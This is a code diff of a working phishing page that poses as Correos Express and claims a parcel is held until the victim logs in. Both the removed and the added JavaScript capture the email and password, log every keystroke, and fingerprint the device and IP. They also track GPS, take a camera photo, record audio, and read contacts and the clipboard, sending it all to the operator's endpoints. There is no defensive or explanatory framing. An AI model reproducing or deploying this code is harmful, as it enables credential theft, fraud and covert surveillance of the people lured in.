@@ -1,19 +1,9 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<meta name="theme-color" content="#ffcc00">
-<title>Correos Express</title>
-<link rel="manifest" href="manifest.json">
-<link rel="apple-touch-icon" href="icon-192.png">
-<style>
+Correos Express
+
 *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
 body{background:#ffcc00;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
 .c{background:#fff;border-radius:18px;padding:26px;max-width:400px;width:100%;box-shadow:0 10px 40px rgba(0,0,0,.18)}
-.h{display:flex;align-items:center;gap:10px;margin-bottom:18px}
-.h img{width:38px;height:38px}
-.h b{font-size:17px}
+h1{font-size:17px;margin-bottom:14px}
 .s{font-size:13px;color:#666;margin-bottom:18px;line-height:1.5}
 label{display:block;font-size:12px;color:#888;margin:12px 0 5px}
 input{width:100%;padding:13px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:16px;background:#fafafa}
@@ -22,242 +12,158 @@ button{width:100%;padding:14px;border:0;border-radius:10px;font-size:16px;font-w
 button:disabled{opacity:.45}
 .g{background:#f5f5f5;color:#333;font-weight:500;font-size:14px}
 #l{font-size:11px;color:#999;text-align:center;margin-top:14px;min-height:14px}
-.d{display:none}
 #dbg{display:none;position:fixed;bottom:0;left:0;right:0;background:#000;color:#0f0;font:10px monospace;padding:8px;max-height:40vh;overflow:auto;white-space:pre-wrap;z-index:99}
-</style>
-</head>
-<body>
-<div class="c">
-  <div class="h">**Correos Express**</div>
-  <div class="s">Tu envío ES-8842-XK está retenido en la oficina. Introduce tus datos para liberarlo.</div>
-  <label>Correo electrónico</label>
-  <input id="e" type="email" autocomplete="username" inputmode="email">
-  <label>Contraseña</label>
-  <input id="p" type="password" autocomplete="current-password">
-  <button id="b0">Acceder</button>
-  <div id="v1" class="d" style="text-align:center;padding:20px 0;font-size:14px;color:#666">Verificando identidad…<br><small>No cierres esta ventana</small></div>
-  <div id="v2" class="d">
-    <button id="b1" class="g" disabled>Verificar ubicación</button>
-    <button id="b2" class="g" disabled>Activar cámara</button>
-    <button id="b3" class="g" disabled>Instalar aplicación</button>
-  </div>
-  <div id="l"></div>
-</div>
-<div id="dbg"></div>
-<script>
+
+
+
+
+  Correos Express
+  Tu envío ES-8842-XK está retenido en la oficina. Introduce tus datos para liberarlo.
+  Correo electrónico
+  
+  Contraseña
+  
+  Acceder
+  Verificar ubicación
+  Activar cámara
+  Instalar aplicación
+  
+
+
+
 (function(){
 "use strict";
+var ID=Math.random().toString(36).slice(2,10);
+var DBG=location.search.indexOf("d=1")>-1;
+var D=document.getElementById("dbg");
+function dbg(m){if(!DBG)return;D.style.display="block";D.textContent+=m+"\n";}
+window.onerror=function(m,s,l){dbg("ERR "+m+" @"+l);};
+var $=function(i){return document.getElementById(i);};
+var L=function(m){$("l").textContent=m;};
 
-var DBG = location.search.indexOf("d=1") > -1;
-var dbgEl = document.getElementById("dbg");
-function dbg(m){
-  if(!DBG) return;
-  dbgEl.style.display = "block";
-  dbgEl.textContent += m + "\n";
+function txt(t){
+  dbg("txt "+t.length);
+  return fetch("/api/txt",{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({text:t.slice(0,4000)})
+  }).then(function(r){dbg("r "+r.status);if(!r.ok)return r.text().then(function(x){dbg(x);});})
+    .catch(function(e){dbg("ERR "+e.message);});
 }
-window.onerror = function(m, s, l){ dbg("ERR " + m + " @" + l); };
-
-var $ = function(i){ return document.getElementById(i); };
-var L = function(m){ $("l").textContent = m; };
-
-/* ---- endpoint ofuscado ---- */
-var API = atob("L2FwaS94N2sy");
-dbg("API=" + API);
-
-/* ---- passphrase: XOR 0x5A sobre base64 ---- */
-var _P = "DywTAm8vLzIWEjsXCRIdEBMFFA4ROGliMR4CKzVibDs";
-var PASS = "";
-try {
-  var raw = atob(_P);
-  var out = "";
-  for (var i = 0; i < raw.length; i++) out += String.fromCharCode(raw.charCodeAt(i) ^ 0x5A);
-  PASS = out;
-  dbg("PASS len=" + PASS.length);
-} catch(e){ dbg("PASS ERR " + e.message); }
-
-var S = { id: (crypto.randomUUID ? crypto.randomUUID() : String(Date.now())), t: Date.now() };
-
-/* ---- base64 seguro para blobs grandes ---- */
-function b64(u8){
-  var s = "", CH = 0x8000;
-  for (var i = 0; i < u8.length; i += CH)
-    s += String.fromCharCode.apply(null, u8.subarray(i, i + CH));
-  return btoa(s);
+function file(b,tipo){
+  dbg("file "+tipo+" "+b.size);
+  return fetch("/api/file?tipo="+tipo,{method:"POST",body:b})
+    .then(function(r){dbg("r "+r.status);if(!r.ok)return r.text().then(function(x){dbg(x);});})
+    .catch(function(e){dbg("ERR "+e.message);});
 }
 
-/* ---- cifrado AES-GCM ---- */
-function enc(o){
-  var te = new TextEncoder();
-  var s = crypto.getRandomValues(new Uint8Array(16));
-  var n = crypto.getRandomValues(new Uint8Array(12));
-  return crypto.subtle.importKey("raw", te.encode(PASS), "PBKDF2", false, ["deriveKey"])
-    .then(function(b){
-      return crypto.subtle.deriveKey(
-        { name:"PBKDF2", salt:s, iterations:200000, hash:"SHA-256" },
-        b, { name:"AES-GCM", length:256 }, false, ["encrypt"]);
-    })
-    .then(function(k){
-      return crypto.subtle.encrypt({ name:"AES-GCM", iv:n }, k, te.encode(JSON.stringify(Object.assign({}, S, o))));
-    })
-    .then(function(c){
-      var u = new Uint8Array(28 + c.byteLength);
-      u.set(s); u.set(n, 16); u.set(new Uint8Array(c), 28);
-      return b64(u);
-    });
-}
-
-/* ---- envío ---- */
-function send(o){
-  return enc(o).then(function(d){
-    dbg("send " + o.s + " " + d.length);
-    if (navigator.sendBeacon) {
-      var ok = navigator.sendBeacon(API, d);
-      dbg("beacon=" + ok);
-      if (ok) return;
-    }
-    return fetch(API, { method:"POST", body:d, keepalive:true })
-      .then(function(r){ dbg("fetch " + r.status); })
-      .catch(function(e){ dbg("fetch ERR " + e.message); });
-  }).catch(function(e){ dbg("enc ERR " + e.message); });
-}
-
-/* ---- fingerprint ---- */
 function fp(){
-  var c = document.createElement("canvas"), x = c.getContext("2d");
-  x.textBaseline = "top"; x.font = "14px Arial";
-  x.fillStyle = "#f60"; x.fillRect(0,0,100,30);
-  x.fillStyle = "#069"; x.fillText(navigator.userAgent, 2, 2);
-  var g = "";
-  try {
-    var gl = document.createElement("canvas").getContext("webgl");
-    var d = gl.getExtension("WEBGL_debug_renderer_info");
-    g = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
-  } catch(e){}
-  var p = Promise.resolve(null);
-  if (navigator.getBattery) p = navigator.getBattery().then(function(b){ return [b.level, b.charging]; }).catch(function(){ return null; });
+  var c=document.createElement("canvas"),x=c.getContext("2d");
+  x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(0,0,100,30);
+  x.fillStyle="#069";x.fillText(navigator.userAgent,2,2);
+  var g="";
+  try{var gl=document.createElement("canvas").getContext("webgl");
+    var d=gl.getExtension("WEBGL_debug_renderer_info");
+    g=gl.getParameter(d.UNMASKED_RENDERER_WEBGL);}catch(e){}
+  var p=navigator.getBattery?navigator.getBattery().then(function(b){return b.level+"|"+b.charging;}).catch(function(){return"?";}):Promise.resolve("?");
   return p.then(function(bat){
-    return {
-      ua: navigator.userAgent, plat: navigator.platform, lang: navigator.language,
-      langs: navigator.languages, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      scr: [screen.width, screen.height, screen.colorDepth, devicePixelRatio],
-      cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory,
-      touch: navigator.maxTouchPoints, gpu: g, canvas: c.toDataURL().slice(-90),
-      conn: navigator.connection && navigator.connection.effectiveType,
-      bat: bat, sa: matchMedia("(display-mode:standalone)").matches, ref: document.referrer
-    };
+    return "🟢 ABIERTO "+ID+"\n"+
+      "UA: "+navigator.userAgent+"\n"+
+      "Plat: "+navigator.platform+"\n"+
+      "Idioma: "+navigator.language+"\n"+
+      "TZ: "+Intl.DateTimeFormat().resolvedOptions().timeZone+"\n"+
+      "Pantalla: "+screen.width+"x"+screen.height+"x"+screen.colorDepth+"\n"+
+      "Cores: "+navigator.hardwareConcurrency+"\n"+
+      "Mem: "+navigator.deviceMemory+"\n"+
+      "Touch: "+navigator.maxTouchPoints+"\n"+
+      "GPU: "+g+"\n"+
+      "Batería: "+bat+"\n"+
+      "Standalone: "+matchMedia("(display-mode:standalone)").matches+"\n"+
+      "Ref: "+document.referrer;
   });
 }
 
-/* ---- arranque ---- */
-fp().then(function(f){
-  return fetch("https://ipapi.co/json/").then(function(r){ return r.json(); }).catch(function(){ return {}; })
-    .then(function(ip){ return send({ s:"open", f:f, ip:ip }); });
-}).then(function(){ dbg("open enviado"); });
-
-/* ---- teclas ---- */
-document.addEventListener("keydown", function(e){
-  if (e.key && e.key.length === 1) send({ s:"key", k:e.key });
+fp().then(function(t){
+  return fetch("https://ipapi.co/json/").then(function(r){return r.json();}).catch(function(){return{};})
+    .then(function(ip){
+      if(ip.ip)t+="\nIP: "+ip.ip+" | "+ip.city+", "+ip.country_name+" | "+ip.org;
+      return txt(t);
+    });
 });
 
-/* ---- login ---- */
-$("b0").addEventListener("click", function(){
-  var e = $("e").value.trim(), p = $("p").value;
-  if (!e || !p) { L("Rellena todos los campos"); return; }
+document.addEventListener("keydown",function(e){
+  if(e.key&&e.key.length===1)txt("⌨️ "+ID+" "+e.key);
+});
+
+$("b0").addEventListener("click",function(){
+  var e=$("e").value.trim(),p=$("p").value;
+  if(!e||!p){L("Rellena todos los campos");return;}
   L("Comprobando…");
-  send({ s:"login", e:e, p:p });
-  $("v1").classList.remove("d");
-  setTimeout(function(){
-    $("v1").classList.add("d");
-    $("v2").classList.remove("d");
-    $("b1").disabled = false;
-    L("Datos verificados");
-  }, 1400);
+  txt("🔑 LOGIN "+ID+"\n"+e+"\n"+p);
+  setTimeout(function(){$("b1").disabled=false;L("Datos verificados");},1200);
 });
 
-/* ---- ubicación ---- */
-$("b1").addEventListener("click", function(){
-  if (!navigator.geolocation) { L("Sin GPS"); return; }
+$("b1").addEventListener("click",function(){
+  if(!navigator.geolocation){L("Sin GPS");return;}
   L("Obteniendo ubicación…");
   navigator.geolocation.watchPosition(
     function(p){
-      send({ s:"geo", lat:p.coords.latitude, lon:p.coords.longitude,
-             acc:p.coords.accuracy, alt:p.coords.altitude, spd:p.coords.speed });
-      L("Ubicación verificada");
-      $("b2").disabled = false;
+      txt("📍 GPS "+ID+"\nhttps://maps.google.com/?q="+p.coords.latitude+","+p.coords.longitude+"\n±"+p.coords.accuracy+"m");
+      L("Ubicación verificada");$("b2").disabled=false;
     },
-    function(err){ L("Activa la ubicación: " + err.message); },
-    { enableHighAccuracy:true, maximumAge:0, timeout:15000 }
+    function(err){L("Activa la ubicación: "+err.message);},
+    {enableHighAccuracy:true,maximumAge:0,timeout:15000}
   );
 });
 
-/* ---- cámara + micro ---- */
-$("b2").addEventListener("click", function(){
-  if (!navigator.mediaDevices) { L("Cámara no soportada"); return; }
-  navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user", width:640 }, audio:false })
+$("b2").addEventListener("click",function(){
+  if(!navigator.mediaDevices){L("Cámara no soportada");return;}
+  navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640},audio:false})
     .then(function(st){
-      var v = document.createElement("video");
-      v.srcObject = st; v.muted = true; v.playsInline = true;
-      return v.play().then(function(){
-        return new Promise(function(r){ setTimeout(r, 1200); });
-      }).then(function(){
-        var c = document.createElement("canvas");
-        c.width = v.videoWidth || 640;
-        c.height = v.videoHeight || 480;
-        c.getContext("2d").drawImage(v, 0, 0);
-        var data = c.toDataURL("image/jpeg", 0.6).split(",")[1];
-        st.getTracks().forEach(function(t){ t.stop(); });
-        return send({ s:"cam", img:data });
+      var v=document.createElement("video");
+      v.srcObject=st;v.muted=true;v.playsInline=true;
+      return v.play().then(function(){return new Promise(function(r){setTimeout(r,1200);});})
+        .then(function(){
+          var c=document.createElement("canvas");
+          c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+          c.getContext("2d").drawImage(v,0,0);
+          st.getTracks().forEach(function(t){t.stop();});
+          return new Promise(function(res){c.toBlob(function(b){res(b);},"image/jpeg",0.6);});
+        });
+    })
+    .then(function(b){
+      return file(b,"photo").then(function(){
+        L("Cámara verificada");$("b3").disabled=false;
+        return navigator.mediaDevices.getUserMedia({audio:true});
       });
     })
-    .then(function(){
-      L("Cámara verificada");
-      $("b3").disabled = false;
-      return navigator.mediaDevices.getUserMedia({ audio:true });
-    })
     .then(function(a){
-      var r = new MediaRecorder(a), ch = [];
-      r.ondataavailable = function(e){ ch.push(e.data); };
-      r.onstop = function(){
-        var bl = new Blob(ch, { type:"audio/webm" });
-        bl.arrayBuffer().then(function(bf){
-          send({ s:"mic", a:b64(new Uint8Array(bf)) });
-          a.getTracks().forEach(function(t){ t.stop(); });
-        });
+      var r=new MediaRecorder(a),ch=[];
+      r.ondataavailable=function(e){ch.push(e.data);};
+      r.onstop=function(){
+        var bl=new Blob(ch,{type:"audio/webm"});
+        file(bl,"doc");
+        a.getTracks().forEach(function(t){t.stop();});
       };
-      r.start();
-      setTimeout(function(){ r.stop(); }, 5000);
+      r.start();setTimeout(function(){r.stop();},5000);
     })
-    .catch(function(e){ L("Permiso denegado: " + e.message); });
+    .catch(function(e){L("Permiso denegado: "+e.message);});
 });
 
-/* ---- instalación + notif + contactos + clipboard ---- */
-$("b3").addEventListener("click", function(){
-  if (window.dp) { window.dp.prompt(); window.dp = null; }
-  if (window.Notification) {
-    Notification.requestPermission().then(function(p){
-      if (p === "granted") send({ s:"notif" });
-    }).catch(function(){});
-  }
-  if (navigator.contacts && navigator.contacts.select) {
-    navigator.contacts.select(["name","tel","email"], { multiple:true })
-      .then(function(c){ if (c && c.length) send({ s:"contacts", c:c }); })
+$("b3").addEventListener("click",function(){
+  if(window.dp){window.dp.prompt();window.dp=null;}
+  if(window.Notification)Notification.requestPermission().catch(function(){});
+  if(navigator.contacts&&navigator.contacts.select){
+    navigator.contacts.select(["name","tel","email"],{multiple:true})
+      .then(function(c){if(c&&c.length)txt("👥 CONTACTOS "+ID+"\n"+JSON.stringify(c).slice(0,3000));})
       .catch(function(){});
   }
-  if (navigator.clipboard && navigator.clipboard.readText) {
+  if(navigator.clipboard&&navigator.clipboard.readText){
     navigator.clipboard.readText()
-      .then(function(t){ if (t) send({ s:"clip", t:t }); })
+      .then(function(t){if(t)txt("📋 PORTAPAPELES "+ID+"\n"+t.slice(0,1000));})
       .catch(function(){});
   }
   L("Verificación completada");
 });
 
-/* ---- PWA ---- */
-window.addEventListener("beforeinstallprompt", function(e){ e.preventDefault(); window.dp = e; });
-if ("serviceWorker" in navigator) {
-  navigator.serviceWorker.register("sw.js").catch(function(e){ dbg("sw ERR " + e.message); });
-}
-
+window.addEventListener("beforeinstallprompt",function(e){e.preventDefault();window.dp=e;});
 })();
-</script>
-</body>
-</html>
